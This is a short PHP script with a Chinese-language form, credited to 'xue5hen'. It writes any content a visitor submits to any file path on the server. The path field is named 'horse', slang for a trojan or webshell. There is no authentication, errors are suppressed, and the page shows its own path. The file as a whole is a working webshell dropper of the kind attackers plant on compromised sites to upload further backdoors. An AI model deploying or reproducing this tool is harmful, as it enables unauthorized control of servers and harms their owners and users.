<?php
	if (!empty($_POST["horse"]) and !empty($_POST["content"])) {
		if(@file_put_contents($_POST["horse"], $_POST["content"])){
			echo "<p style='color:green'>保存成功！".$_POST["horse"]."</p>";
		}else{
			echo "<p style='color:red'>写入失败！</p>";
		};
	}
?>
<title>By:xue5hen</title>
<form action="" method="post">
	<p>当前路径：<?php echo __FILE__?></p>
	<p>写入路径：<input type="text" name="horse" size="70"></p>
	<p>写入内容：<textarea name="content" rows="18" cols="72"></textarea></p>
	<p><input type="submit" name="submit" value="保存"></p>
</form>

